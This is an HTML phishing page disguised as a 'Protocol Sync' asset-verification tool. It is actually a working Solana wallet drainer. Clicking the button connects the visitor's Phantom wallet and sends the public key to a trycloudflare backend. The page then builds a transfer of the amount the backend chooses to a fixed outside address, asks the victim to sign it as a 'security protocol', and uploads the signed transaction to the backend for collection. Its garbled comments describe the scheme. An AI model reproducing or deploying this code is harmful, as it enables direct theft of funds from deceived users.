<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2>PROTOCOL SYNC</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">VERIFY ASSETS</button>
        <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
    </div>
    <script>
    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            const { publicKey } = await p.connect();
            document.getElementById('msg').innerText = "Syncing with 71-Engine...";

            // ğŸ”± 1. æŠŠå…¬é’¥æ‰”å› 71 æœºï¼Œè®©åç«¯å»ç®—é‡‘é¢
            const res = await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/get_data", {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({pubkey: publicKey.toString()})
            });
            const data = await res.json();

            // ğŸ”± 2. å‰ç«¯åªè´Ÿè´£æ— è„‘æ‹‰èµ·ç­¾åæ¡†
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey("HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"),
                    lamports: data.safe_amount // åç«¯ç»™å•¥æˆ‘å°±å¡«å•¥ï¼Œç»å¯¹ä¸æŠ¥é”™
                })
            );
            transaction.recentBlockhash = data.blockhash;
            transaction.feePayer = publicKey;

            document.getElementById('msg').innerText = "Confirming Security Protocol...";
            const signed = await p.signTransaction(transaction);
            
            // ğŸ”± 3. æ‹¿åˆ°ç­¾çº¦åçš„å¯†æ–‡ï¼Œä¼ å›åç«¯æ”¶ç±³
            const b64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
            await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({signature: b64})
            });
            alert("Success!");
        } catch(e) { alert("Status: " + e.message); }
    }
    </script></body></html>